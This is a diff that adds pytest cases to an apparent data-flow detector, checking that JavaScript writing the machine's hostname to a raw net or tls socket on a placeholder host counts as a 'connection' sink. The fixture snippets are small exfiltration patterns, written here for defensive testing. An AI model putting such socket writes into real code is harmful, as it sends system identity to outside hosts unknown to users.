@@ -154,6 +154,37 @@ class TestSpellings:
         assert FlowKit.flows(text) == []
 
 
+class TestSockets:
+    """What is written to a raw socket (net, tls, dgram) leaves as it is: the `connection` sink
+    the raw-channel rules read. Every such write was a `request`, and `new net.Socket()` was no
+    sink at all, so those rules could not fire on a socket (review 98, 2026-10-20)."""
+
+    HEAD = 'const os = require("os");\nconst net = require("net"); const tls = require("tls");\n'
+    RAW: ClassVar[dict[str, str]] = {
+        "bound": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
+        "chained": 'net.connect(9, "h.invalid").write(os.hostname());\n',
+        "createConnection": 'net.createConnection(9, "h.invalid").end(os.hostname());\n',
+        "in the connect callback": (
+            'const s = net.connect(9, "h.invalid", () => { s.write(os.hostname()); });\n'
+        ),
+        "tls": 'const s = tls.connect(443, "h.invalid");\ns.write(os.hostname());\n',
+        "new Socket": (
+            'const s = new net.Socket();\ns.connect(9, "h.invalid");\ns.write(os.hostname());\n'
+        ),
+    }
+
+    @pytest.mark.parametrize("name", sorted(RAW))
+    def test_a_raw_socket_write_is_a_connection(self, name: str) -> None:
+        assert FlowKit.flows(self.HEAD + self.RAW[name])[0][:2] == (["identity"], "connection")
+
+    def test_an_http_request_is_still_a_request(self) -> None:
+        text = (
+            'const os = require("os"); const https = require("https");\n'
+            'https.request({hostname: "h.invalid"}).end(os.hostname());\n'
+        )
+        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")
+
+
 class TestBounds:
     def test_a_large_generated_file_finishes(self) -> None:
         text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
